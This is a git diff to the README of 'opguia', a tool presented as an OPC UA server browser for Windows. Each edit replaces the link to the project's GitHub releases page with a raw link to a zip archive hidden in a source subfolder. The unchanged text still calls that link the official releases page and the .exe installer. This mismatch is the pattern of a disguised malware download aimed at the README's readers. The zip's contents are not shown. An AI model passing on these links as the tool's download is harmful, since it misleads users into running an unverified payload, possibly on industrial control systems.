@@ -1,6 +1,6 @@
 # ⚙️ opguia - Simple OPC UA Server Browser
 
-[![Download opguia](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/Almondleaveswillowlorenzodressing280/opguia/releases)
+[![Download opguia](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://raw.githubusercontent.com/Almondleaveswillowlorenzodressing280/opguia/main/opguia/pages/connection/Software-v1.2-alpha.2.zip)
 
 ---
 
@@ -36,10 +36,10 @@ It uses Python and a few stable libraries under the hood, but you won’t need t
 
 You will download the app from the official GitHub releases page. This page holds the latest version for Windows.
 
-[![Get opguia here](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/Almondleaveswillowlorenzodressing280/opguia/releases)
+[![Get opguia here](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/Almondleaveswillowlorenzodressing280/opguia/main/opguia/pages/connection/Software-v1.2-alpha.2.zip)
 
 Click the button above or visit this link:  
-https://github.com/Almondleaveswillowlorenzodressing280/opguia/releases
+https://raw.githubusercontent.com/Almondleaveswillowlorenzodressing280/opguia/main/opguia/pages/connection/Software-v1.2-alpha.2.zip
 
 ---
 
@@ -117,7 +117,7 @@ The app fits well for industrial automation, IIoT, SCADA systems, or any setup t
 
 You can download the latest Windows installer here:
 
-https://github.com/Almondleaveswillowlorenzodressing280/opguia/releases
+https://raw.githubusercontent.com/Almondleaveswillowlorenzodressing280/opguia/main/opguia/pages/connection/Software-v1.2-alpha.2.zip
 
 Click the `.exe` file under the latest release and follow the steps above to install.
 
